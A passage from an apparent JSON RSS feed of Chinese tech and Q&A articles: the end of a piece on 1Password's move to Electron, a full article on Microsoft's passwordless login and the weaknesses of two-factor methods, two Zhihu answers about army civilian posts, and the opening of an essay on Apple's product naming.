应用」，<a href=\"https://daringfireball.net/linked/2020/03/20/mac-assed-mac-apps\">“Mac-assed” Mac app</a>），以此来要求和批评 1Password 是不合适的。</p>\n<p>例如，设计师 Matt Birchler <a href=\"https://birchtree.me/blog/desktop-apps-aint-what-they-used-to-be/\">撰文指出</a>：</p>\n<blockquote><p>[Things、Reeder、iStat Menus 和 Craft] 都是优秀的原生 Mac 应用，但它们用的定制 UI 元素可谓五花八门。</p></blockquote>\n<blockquote><p>1Password 7 的 UI 哪部分是遵循 Mac 惯例或与系统内置 UI 元素相同的？[…] 与新版相比怎么就更像一个原生 Mac 应用了呢？</p></blockquote>\n<blockquote><p>当今世界上，大多数人都在浏览器中完成大量工作，没有明确理由就不会另装一个应用；因此，Mac 上的原生与非原生应用之争，更多是一种学究而非务实。诚然，Electron 应用可能很差，但你在弃坑之前总得实际用用，知道它差在哪。同理，一个原生应用也未必就快速、轻量、可靠……macOS 版的「音乐」应用就是一例。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/ba59cd4d0eb67fa8504774972a196b2e\" alt=\"\"></figure><p>其他一些辩护角度还包括：</p>\n<ul>\n<li>Casey Liss 在播客 <a href=\"https://atp.fm/444\">Accidental Tech Podcast</a> 中认为，<strong>选用 Electron 的影响要结合应用的使用场景判断</strong>。以 1Password 为例，除了初始设置时需要多花些时间整理和导入密码，此后需要与界面打交道的机会并不多（某种程度上说，1Password 的价值和目标，正是让用户花在「查密码」这件事上的时间尽可能短暂）。因此，界面是不是原生对于用户体验的影响就很有限了。</li>\n<li>Stephen Hackett 在播客 <a href=\"https://www.relay.fm/connected/359\">Connected</a> 中提出，1Password <strong>提高对企业用户的重视程度是商业上合理的选择</strong>。随着各大操作系统、浏览器纷纷推出和完善密码管理功能，可以预见将有越来越多的普通用户选择这些现成方案，导致 1Password 的市场机会受到蚕食。因此，转向企业市场是必要的。</li>\n</ul>\n<h2>相关事件/延伸阅读</h2>\n<p><strong>用 Electron 框架制作出原生质感的应用并非天方夜谭。</strong> GitHub 通知管理工具 Lotus 的开发者<a href=\"https://getlotus.app/21-making-electron-apps-feel-native-on-mac\">讨论</a>了如何从窗口加载、标题栏可拖拽区域、字体选用、鼠标指针、菜单设置等细节入手，让 Electron 尽可能贴近原生效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/f89a2a5b991a7040da1d508caa840b37\" alt=\"\"></figure><p><strong>1Password 并不是第一个因转向 Electron 和订阅制而被受到质疑的 Mac 应用。</strong> 2020 年 4 月，另一款颇具口碑的老牌备份工具 Arq <a href=\"https://www.arqbackup.com/blog/arq-6-more-power-more-security-more-storage-savings/\">宣布推出第 6 版</a>，同样采用 Electron 编写界面部分（后台进程则继续使用 Objective-C），并取消了部分用户惯用的旧版功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/df21d2b051c67cc2b276d3e924d91587\" alt=\"\"></figure><p>在收到大量负面评价后，开发者在几天后即<a href=\"https://www.arqbackup.com/blog/arq-6-next-steps/\">出面道歉</a>，宣布将逐渐加回缺失的功能。不到一年后的 2021 年 2 月，下一个大版本 <a href=\"https://www.arqbackup.com/blog/arq-7-released/\">Arq 7</a> 完全放弃了 Electron，重新用回了原生框架编写界面。</p>\n","link":"https://sspai.com/post/68892"},{"title":"微软想让你不再动手输密码了，这个省事的方案有多安全？","date":"2021-09-23 06:30:32","description":"\n<blockquote><p>Beginning today, you can now completely remove the password from your Microsoft account.</p></blockquote>\n<p>2021 年 9 月 15 日，微软安全、合规和身份副总裁（Corporate Vice President, Security, Compliance and Identity）Vasu Jakkal <a href=\"https://www.microsoft.com/security/blog/2021/09/15/the-passwordless-future-is-here-for-your-microsoft-account/\" target=\"_blank\">宣布</a> 用户在登录微软旗下的账号时（具体范围参见下文）再也不用输入那些难缠的密码了。微软的这一举动引发了不少关注，毕竟对于无密码一事大家莫衷一是。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561ftlb34tdol81mpa0.png\"><figcaption>当你在微软启用无密码登录以后（图片来自于微软网站）</figcaption></figure><p>其实微软的「无密码」之路早有端倪，在 2017 年，微软就在先前 Microsoft Authenticator 两步验证的基础之上，<a href=\"https://techcommunity.microsoft.com/t5/azure-active-directory-identity/no-password-phone-sign-in-for-microsoft-accounts/ba-p/245254\" target=\"_blank\">允许</a> 用户免密（不用输入密码）登录微软账户。Microsoft Authenticator 目前已经不止于两步验证，更多用法可参见文章 <a href=\"https://sspai.com/post/65633\" target=\"_blank\">密码管理，多一种选择</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fttb34te7d7m58v0.png\"><figcaption>使用 Microsoft Authenticator 进行无密码登录（图片来自于微软网站）</figcaption></figure><p>2018 年，微软再进一步，<a href=\"https://www.microsoft.com/en-us/microsoft-365/blog/2018/04/17/windows-hello-fido2-security-keys/\" target=\"_blank\">支持</a> FIDO2 安全密钥的无密码登录。安装了 Windows 10 2018 年 10 月更新的用户可以通过设置 Windows Hello （网络摄像头或者指纹读取器）或者来自 Yubico‎‎ / ‎‎FEITIAN‎‎ 的支持 FIDO2 标准的安全密钥设备，并通过 Edge 访问微软账户设置，将账户与 Windows 10 电脑相连，这样就可以实现无密码访问。</p>\n<p>2019 年，微软 <a href=\"https://blogs.windows.com/windows-insider/2019/07/10/announcing-windows-10-insider-preview-build-18936/#W56yUs3oRz1wvLzI.97\" target=\"_blank\">首次</a> 为 Windows 10 引入了无密码登录， 而在今年 3 月，微软为商业用户 <a href=\"https://techcommunity.microsoft.com/t5/azure-active-directory-identity/passwordless-authentication-is-now-generally-available/ba-p/1994700\" target=\"_blank\">引入</a> 了无密码登录。</p>\n<h2>微软所说的无密码是什么？</h2>\n<p>其实如果你使用过 Microsoft Authenticator，那么对于微软此次提到的无密码应该不至于太陌生。毕竟在使用 Microsoft Authenticator 登录 Outlook 邮箱的时候，就不用输入密码。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fu5b34tdookl6g4g.gif\"><figcaption>Microsoft Authenticator ，无需输入密码便捷登录微软服务</figcaption></figure><p>微软所说的无密码其实就是允许用户删除账户密码。密码删除之后，用户可以通过 Microsoft Authenticator 应用、 Windows Hello、FIDO2 安全密钥等这样的一些无密码的身份验证方法来登录。</p>\n<p>目前微软旗下的 Microsoft 365、Teams、Outlook、OneDrive、Family Safety（微软家长监护服务）以及<s>微软边缘浏览器</s> Microsoft Edge 已经 <a href=\"https://blogs.windows.com/windowsexperience/2021/09/15/microsoft-announces-passwordless-future-available-across-microsoft-edge-and-microsoft-365-apps/\" target=\"_blank\">可以</a> 无密码化了。对于那些想感受无密的用户而言，可以参照微软的 <a href=\"https://support.microsoft.com/zh-cn/account-billing/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-microsoft-%E5%B8%90%E6%88%B7%E8%BF%9B%E8%A1%8C%E6%97%A0%E5%AF%86%E7%A0%81%E8%AE%BF%E9%97%AE-4d4b4267-7d04-4402-9aac-4436a063d004\" target=\"_blank\">帮助文档</a> 进行操作。</p>\n<p>需要注意的是，对于较旧版本的 Windows、应用和服务仍然需要密码。这当中包括：</p>\n<ol>\n<li>Xbox 360</li>\n<li>Office 2010 或更早版本</li>\n<li>Office for Mac 2011 或更早版本</li>\n<li>使用 IMAP 和 POP 电子邮件服务的产品和服务</li>\n<li>Windows 8.1、Windows 7 或更早版本</li>\n<li>一些Windows包括远程桌面和凭据管理器的功能</li>\n<li>某些命令行和任务计划程序服务。</li>\n</ol>\n<h2>使用密码为什么会不安全？</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fudb34te7d7m58vg.png\"><figcaption>场景的认证手段（图片来自于微软网站）</figcaption></figure><p>很多人都已经认识到了采用「12356」这样密码的安全性问题。这种安全性问题给用户和网站两方都产生了一定的影响。用户转向使用 1password、Microsoft Edge 等 App 自动生成的强密码；网站要求用户采用包括字母大小写、数字、符号等要素的最低8位的密码成为一种常态。然而，不管是前者还是后者都对用户的记忆力提出了挑战。</p>\n<p>所以在这种情况之下，（尽管知道这样不安全）很多人就开始了「一码用万站」，或者用简单的口诀（密码公式）来记忆密码，如数字＋网站的形式（比如 0755sspai ）。这两种方式，前者能占到 10%，而后者则高达 40%。抛开网站不讲，日常中也充斥着使用相同密码的例子，大部分人名下的银行卡密码都是相同的。</p>\n<blockquote><p>我向来<i>知道哪条路是对的</i>，但我从来不走，……因为 TMD 的难了。</p></blockquote>\n<p>与己方便，自然也会与人方便。容易记住的密码，自然也就更容易被黑客猜到。一旦黑客攻击网站得手或者网站本身发生密码泄露，那么用户采用了相同的密码的其他网站就会受到波及。轻则个人隐私信息流出，重则影响到个人的财产安全。</p>\n<h3>两步认证是如何保证密码安全的？</h3>\n<p>在前文中，我们已经了解到密码使用中存在的一些问题。为了更好提升用户账户的安全性，在密码验证的基础之上，厂商又推出了多重要素验证（Multi-factor authentication，缩写为 MFA）用来在账户登录的时候提供额外的保护。在 MFA 中有一个特例，两步认证（2-Step Verification，也称 Two-factor authentication，缩写为2FA）经常被使用。</p>\n<p>在今天我们的网络生活乃至线下的生活中，我们能够见到各种各样的两步认证方案。</p>\n<h4>PIN 码</h4>\n<p>PIN 码，即用户个人识别码（Personal identification number，缩写为 PIN）。它是一串数字组成用于确认用户身份的授权通行码。这种两步认证方式在银行卡系统中比较常见。</p>\n<h4>基于时间的一次性密钥和 One-time passcodes</h4>\n<p>基于时间的一次性密钥（Time based one-time passcode，缩写 TOTP）是一种常见的动态密码产生方式，它是一种根据预共享的密钥与当前时间计算一次性密码的 <a href=\"https://zh.wikipedia.org/wiki/%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95\" target=\"_blank\">算法</a>，顾名思义主要基于时间为服务器与密代码生成器的同步条件。登录/验证时利用密码生成器产生动态密码，过时不用或者验证之后该密码自动失效。常见的 TOTP 密钥生成器主要分为软件和硬件，前者如 Google 身份验证器和 Microsoft Authenticator，后者比如网易的将军令、一些银行的动态密码令牌。</p>\n<p>这里所提到的 One-time passcodes 是指在设置完两步认证之后，服务的提供商可能会让你备份的另外几个代码，这些代码将起到救命稻草的作用，比如用户在丢失了 TOTP 以后用来进行两步认证。比如在 iPhone 开启两步认证之后，Apple 给用户生成的恢复密钥。</p>\n<h4>短信 / 语音电话 / 邮件</h4>\n<p>短信（或语音电话）与邮件也是一种比较常见的两步认证方式。前者在使用银行进行在线交易的时候会经常用到；而后者在登录某些网络服务的时候也必不可少，比如 Notion 开始之初就是走的邮箱路线。</p>\n<p>而对于那些开启了两部认证的 Gmail 用户来讲，当在陌生电脑上登录的时候，Google 也发送相应的短信进行二次验证。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fudb34te7d7m5900.png\"><figcaption>Google 登录时提供了多种多样的两步认证机制</figcaption></figure><h4>Apple iOS 服务发来的两步认证与 Google App 里的「确认」</h4>\n<p>作为手机界的两强，iOS 背后的 Apple 和 Android 背后的 Google 在两步认证上各有各的招数。</p>\n<p>对于 iOS 和 Mac的用户来讲，Apple ID的两部验证应当不会感到陌生。在 iOS 9 或 OS X El Capitan 及以上版本系统的设备，都可以开启双重认证。Apple ID 两步验证开启之后，后续的每次更改账户信息，苹果的服务器都会发代码到授信设备上以验证登陆者的身份。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/26902\" target=\"_blank\">如何开启 Apple ID 两步验证，预防隐私泄露</a></p>\n<p>而对于使用 Google 服务的用户而言，除了会收到上文所提到的短信，他还会在登录的邮箱及辅助邮箱中收到一封 Google 发来的登录确认邮件；即便是登录未遂，同样两个邮箱也会收到提醒邮件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fulb34tdol81mpag.png\"><figcaption>提供给邮件额外进行一次提醒</figcaption></figure><p> </p>\n<h4>手机 / 设备 / 单独硬件的生物识别</h4>\n<p>生物识别技术现在多指对生物体（一般特指人）本身的生物特征来区分生物体个体的计算机技术。日常中比较常见的生物识别主要包括指纹和人脸。</p>\n<p>这当中的例子对于我们来讲最熟悉不过的就是信用卡的在线开卡了，手机充当一个生物识别的硬件，人脸则是认证通过的「密钥」。在微软无密码化的布局中，Windows Hello 也是有使用到生物识别，</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561futb34te7d7m590g.png\"><figcaption>Windows Hello 面容与指纹信息，图片来自于微软网站</figcaption></figure><h4>单独的硬件密钥</h4>\n<p>硬件密钥由于采用了硬件设备而不是传统上的密码来处理身份验证，因而其安全性得以提高。这种密钥通常是 USB 设备，也有采用蓝牙或者 NFC 等形式。在日常中登录银行网站使用的 U 盾其实就是硬件密钥的一种。</p>\n<p>在使用中，网站可以通过调用 WebAuthn API 的形式访问硬件密钥。微软在无密码登录中也支持硬件密钥登录方式，不过需要 FIDO2 标准。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fv5b34tdol81mpb0.jpeg\"><figcaption>Yubico 的硬件安全密钥，图片来自于微软网站</figcaption></figure><h2>无密码之后，再看两步认证方式的安全性</h2>\n<p>世上并不存在完美无瑕的东西，两步认证也是一样。在没有密码以后，上面提到的这些两步认证方式也或多或少的存在一些问题，而这些两步认证的方式也是这次微软无密码认证中的重要组成。</p>\n<p>这当中首当其冲的就是他们在面对黑客攻击时是十分脆弱的。在这些攻击当中，通道劫持（Channel Jacking）和实时的网络钓鱼因其攻击成本较低是无密码身份证验证器被攻击的主要方式。</p>\n<p>以通道劫持为例。许多身份验证器都是靠通信通道来工作的。这当中对于我们来讲，更为熟知的可能就是诈骗短信了。根据微软的 <a href=\"https://techcommunity.microsoft.com/t5/azure-active-directory-identity/all-your-creds-are-belong-to-us/ba-p/855124#:~:text=All%20Authenticators%20Are%20Vulnerable%20%20%20Credential%20,indicates%20approva%20\" target=\"_blank\">数据</a>，日常中我们常见的通道占比大致是电子邮件（55%）、短信（44%）、推送通知（4%）和语音通话（1%）。这当中通过服务器进行传输的一次性密码易发生通道劫持的情况。</p>\n<blockquote><p>手机获得登录验证码的时候，手机（以及相关的移动运营商、基础设施、客户支持和 SIM 卡等）就是这里所提到的通道。</p></blockquote>\n<p>而在网络钓鱼的问题上，早在 1987 年网络钓鱼就已经 <a href=\"https://zh.wikipedia.org/wiki/%E9%92%93%E9%B1%BC%E5%BC%8F%E6%94%BB%E5%87%BB\" target=\"_blank\">出现</a>。网络钓鱼通常引导用户到网址与接口与真实站点近乎克隆的网址上输入个人信息，进而套取用户的个人数据乃至资产信息。尽管道理大家都懂，但是事实上直到今天，打击网络钓鱼的行为，更进一步讲侦测网站是否是「假货」在实际上仍然很困难。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c561fv5b34te7d7m5910.png\"><figcaption>微软借用罗马神话中的双头雅努斯（Janus）来阐述网络钓鱼，图片来自于微软网站</figcaption></figure><p>上文中提到的基于时间的一次性密码（TOTP）、 Microsoft Authenticator 这样的身份验证应用程序都有可能发生实时网络钓鱼的问题。</p>\n<p>除了行走在网络中的黑客，现实中的一些问题也是绕不过去的：肩窥（Shoulder surf，站在别人身后，视线越过他人的肩膀偷窥输密码的行为）、TOTP 设备可能发生的电量用完与时钟不同步、实体设备 / 载体被盗……</p>\n<p>除了上面这些问题之外，对于硬件来讲，绕不过去的还有一个质量问题。尽管厂商用各种措施来保障，但质量问题一旦发生其影响对于用户来讲是非常严重的。稍加检索，我们不难发现各种硬件厂商召回的消息。</p>\n<h2>写在最后</h2>\n<p>没有了密码，也就不会密码被盗。微软这种从源头上取消密码的做法倒也不失为一种思路。在一步步推进无密码化的同时，微软也已经在其内部践行无密码的理念。按照 Vasu Jakkal <a href=\"https://www.microsoft.com/security/blog/2021/09/15/the-passwordless-future-is-here-for-your-microsoft-account/\" target=\"_blank\">所说</a>，在微软几乎 100% 的公司雇员已经在使用无密码登录的方式登录他们的公司账户。</p>\n<p>然而对于无密码化而言，尽管微软给出了「简单、快速、安全」这样的高评价；但这并不意味着，这条无密码之路走起来一片坦途。</p>\n<p>暂且不说无密码化在推行的过程中会遇到的各种老旧系统与服务的兼容性问题，光是一个解决方案中的联网问题就够让用户头大了。一旦无法访问互联网或者网络故障，那么用户剩下的就只是焦虑了。</p>\n<p>在无密码化的推行的过程当中，微软遇到的最重要的一个问题可能就是改变用户的观念了。说服用户接受一个无密码的账户，这并非易事。我们可以近似的类比一下现实中信用卡密码有无的问题。即便是微软的体量如何之巨，敢为天下先，但微软人数毕竟只是茫茫人海中的一粒沙。</p>\n<p>此外，即便是微软的无密码化取得了成功，它也会面临一个大范围推广的问题。网络上成千上万种服务的都会涉及到密码的问题，这些服务背后的厂商他们是否愿意与微软进行合作，用户是否放心他们之间进行合作，这些都是一个打问号的事情。</p>\n<p>最后，就我个人而言，虽然已经用 Microsoft Authenticator 取代了 1Password 的部分功能，但是目前依然是保持观望，没有追随微软步伐、删掉密码的打算。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，每天了解科技圈的新鲜事 📰</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派 sspai 官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68936"},{"title":"军队文职上岸是一种怎样的体验？","date":"2021-09-23 04:02:24","description":"\n<p>2020年2月24日，空降兵部队医院内科楼呼吸科，一场<b>特殊的入党宣誓仪式</b>正在举行。</p>\n<p>“我志愿加入中国共产党，拥护党的纲领，遵守党的章程，履行党员义务，执行党的决定……”</p>\n<p><img src=\"https://pic3.zhimg.com/v2-25467d141ed2f64c072babadadb48cb8_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"watermark\" data-original-src=\"v2-25467d141ed2f64c072babadadb48cb8\" data-watermark-src=\"v2-0658c364022e0c99c0705d0fef39a0ad\" data-private-watermark-src=\"v2-df9da2ffb531324bde4d1f20aca94503\"></p>\n<p>庄严的宣誓声来自该病区的相对清洁区，<b>一位肩扛文职军衔的94年小姑娘</b>，在心内科廖奕华书记的带领下，在干部空勤科的邓静修医生、呼吸科的刘瑛医生、董鑫医生、刘燕护士长的见证下，戴着口罩，<b>面对党旗，高举右拳，眼神坚定，铿锵宣誓。在抗击疫情的一线正式成为一名中国共产党预备党员。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-00b0456986b5235292d067960ba379f6_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"watermark\" data-original-src=\"v2-00b0456986b5235292d067960ba379f6\" data-watermark-src=\"v2-6c38d0b7d2278ff601c00266b36aa368\" data-private-watermark-src=\"v2-3782b603445b9d546782f2c40c171439\"></p>\n<p>这位在特殊的时间、特殊的地点加入党组织的90后小姑娘叫刘娟，文职人员，是一名呼吸科的医生。入党仪式礼成后，身材娇小的她激动不已，她对笔者说道：<b>“此时此刻，我身在武汉防控一线，怀着激动的心情接受着党的洗礼，倍感光荣，同时又深感压力。今后我会时刻以一名共产党员的身份严格要求自己，甘于奉献，勇于牺牲；为人民群众的生命健康，勇往直前，用实际行动来证实初心。”</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a77153fbc8516cb13d0a07f9eff9908f_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-a77153fbc8516cb13d0a07f9eff9908f\" data-watermark-src=\"v2-1f35642618aac646d270decfe4369b2f\" data-private-watermark-src=\"v2-ef2e432258809911373ab760a12c313e\"></p>\n<p>刘娟出生在湖北省荆州市公安县南平镇，是家里的独生女。1998年发生洪灾，南平镇是洪水重灾区，人民英雄李向群为了南平镇的抗洪救灾，牺牲在了一线。那个时候的刘娟听说李向群先进事迹后，深受感动，暗暗在心里告诉自己要向烈士那样全心全意为人民服务，不怕苦，不怕累，不怕牺牲。</p>\n<p>2012年，刘娟考入湖北中医药大学，在大学里刘娟受到了更加全面系统的党的理论知识学习，更坚定了共产主义信仰，积极向党组织靠拢，并一直以党员的标准要求自己。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-31bbec050247fa953c706070cfebaab5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"458\" data-watermark=\"watermark\" data-original-src=\"v2-31bbec050247fa953c706070cfebaab5\" data-watermark-src=\"v2-a3caeae5d53457fc4577b5e5aeb563bf\" data-private-watermark-src=\"v2-88d777bc8249830114c2252797927b7c\"></p>\n<p>刘娟研究生毕业后，考上了空降兵部队医院文职人员。在集训过程中，刘娟对党和军队有了更深的了解。<b>明白作为军人要严格地做到令行禁止和不讲条件的执行，牢固树立姓军为兵，姓军为战的思想。刘娟很快从地方人员转变为军队人员，真切感受到担负的使命和责任。</b></p>\n<p>回到医院后，刘娟很快投入住院医师的工作，认真负责，尽心尽力为患者减轻痛苦。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8e28998fee0b556162d738d8b960c026_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-8e28998fee0b556162d738d8b960c026\" data-watermark-src=\"v2-0c5863dfbd982b0573717d227cddf1a9\" data-private-watermark-src=\"v2-99c1d401366b2dd679a9c53aaaf14af0\"></p>\n<p>今年1月，随着新冠病毒在武汉迅速蔓延，面对病毒的挑战，刘娟没有退缩，一直坚守在一线。</p>\n<p>在科室缺乏防护装备的时候；在病患人数不断增加，病人的体温此起彼伏、病情变化迅速的时候；在值班24小时，双手颤抖，病例仍然写不完的时候，<b>刘娟没有气馁，再苦再累，风险再大，作为一名医生，救死扶伤是使命。</b></p>\n<p>面对生病的武汉，疫情是敌人，要打赢这场攻坚战，就要载着军医的使命，坚守岗位，将自己的所学所得发挥最大效用。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0948cb3534b58b20aa20ff1f51cfd2ed_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1439\" data-watermark=\"watermark\" data-original-src=\"v2-0948cb3534b58b20aa20ff1f51cfd2ed\" data-watermark-src=\"v2-93f9dc49f641deb24db5dcd21d451463\" data-private-watermark-src=\"v2-9ee21c2e5a2c26531e34ec9c96420c1a\"></p>\n<p>刘娟的入党介绍人呼吸科主任严峻告诉笔者，年前有位进医院的患者，入院的时候病情危重，俯着身子坐在轮椅上，双手微颤，呼吸急促，额头满布汗水，大大的眼睛布满红血丝，极度缺氧。</p>\n<p>当时因为新冠指南未出，治疗方案尚未统一，医院还没有特别有效的抗病毒药物，采取对症处理，把氧气开放到最大，但患者仍呼吸困难，不能平卧。患者的检查结果出来后，发现情况很糟糕，科室要给患者家属下病危通告，但不把真实情况告诉患者。</p>\n<p>刘娟不顾自己工作的繁忙，一有空就会去病房查房，告诉患者情况还好不要有太大压力，并不断地鼓励他积极配合治疗，保持好的心态，共同把这段最难熬时间扛过去，病自然就好了。科学的药物治疗，加上刘娟每天的不断鼓励，患者情况出现慢慢的好转，指脉氧上升，可以平躺睡眠，可以不戴氧气，可以下地活动，直到精神好转，顺利出院。</p>\n<p>同为刘娟入党介绍人的呼吸科护士长刘燕告诉笔者，有一位70岁的老爹爹，是个孤寡老人，一直独居在家。这个爹爹是刘娟接诊的，比较有意思的是爹爹住进来的时候，塞给刘娟一张纸条，上面密密麻麻写着自己的症状流水：什么时候发病、怎么不舒服、用过什么药、服药后有什么不适等等。</p>\n<p>刘娟知道这是个很“讲究”的爹爹，便放心地告诉爹爹他们会采取怎样的治疗方式，爹爹也会每天塞给她一张早早就写下的单子，详细记录了他的症状、体征。因为老人入院住得急，有一些生活用品没带，又怕自己外出传染给别人，就在当天塞给刘娟的症状流水中加了一栏：需要帮忙采购的生活用品。</p>\n<p>刘娟看到后，二话没说，第二天上班前按照“购物单”的要求买了物品送过去，爹爹很感激。爹爹的病情恢复得也很快。爹爹出院的时候刘娟正好在查房，看见爹爹正好在写纸条，凑过去看，上面密密麻麻写了自己回家的注意事项，什么时候解除隔离。这些都是刘娟平时告诉爹爹的，看来爹爹都听得很认真。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-088a62dec00224e312a4b8a8d29ee2db_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"watermark\" data-original-src=\"v2-088a62dec00224e312a4b8a8d29ee2db\" data-watermark-src=\"v2-a786c36ac075b47e2ef397107ea58673\" data-private-watermark-src=\"v2-57c654d6db47777b6a735448bc816689\"></p>\n<p><b>“用爱拥抱每一天，用心呵护每一人。”这是刘娟常常挂在嘴边的一句话，也是她的人生信条。</b></p>\n<p>“行动是最好的入党誓言，不管龙潭虎穴，哪怕九死一生，我绝不畏惧。”</p>\n<p>这就是我们火线入党的同志——刘娟，用娇小的身躯奋力抵住疫情的蔓延。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wo-men-de-tian-kong-31-71?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">我们的天空</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/480982101/answer/2071916643?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">118 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/440306057?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有没有靠谱的军队文职课程？</a><br><a href=\"http://www.zhihu.com/question/377474469?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">备考军队文职学习视频应该看哪家的？</a><br>\n","link":"http://www.zhihu.com/question/480982101/answer/2071916643?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"军队文职上岸是一种怎样的体验？","date":"2021-09-23 04:01:40","description":"\n<p>很多人对于军队文职不了解，甚至不知道是干嘛的，其实这也很正常</p>\n<p>军队文职是从18年才开始大规模的面向社会开始招生的，还是太年轻了</p>\n<p>给大家总结了一些军队文职的相关经验和问题，感兴趣的话就点进来看看吧</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/chao-ge-ge-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">文职君</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/480982101/answer/2083243001?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">118 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/440306057?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有没有靠谱的军队文职课程？</a><br><a href=\"http://www.zhihu.com/question/377474469?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">备考军队文职学习视频应该看哪家的？</a><br>\n","link":"http://www.zhihu.com/question/480982101/answer/2083243001?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"浮名迷真性，硬核助本心——浅谈苹果的命名困局","date":"2021-09-23 03:30:11","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>引言</h2>\n<p>西方语境中，13 不是一个好数字：背叛耶稣基督的犹大，据信是最后的晚餐餐桌上第 13 个就座的人。于是，西方人不喜欢数字 13 的传统一直延续到今天，很少有人宴客会邀请 13 个人，12 或 14 人都可以，13 不行。</p>\n<p>不巧的是，今年 9 月刚刚发布的新 iPhone，按照产品迭代顺序，正好是 iPhone 13。因此，发布会之前一个常被提出的问题是， Apple 会考虑另一个名字来绕过它吗？就像 iPhone X 那样？</p>\n<p>随着发布会落下帷幕，答案已经揭晓： Apple 决定继续使用 13 这个编号。不过，回顾 Apple 产品线的命名史，就会发现这样的问题并非孤例： Apple 虽然以市场宣传文风简洁著称，但有时仍会陷入不可解的命名困局。</p>\n<p>本文就将从 Mac、iPhone、iPad 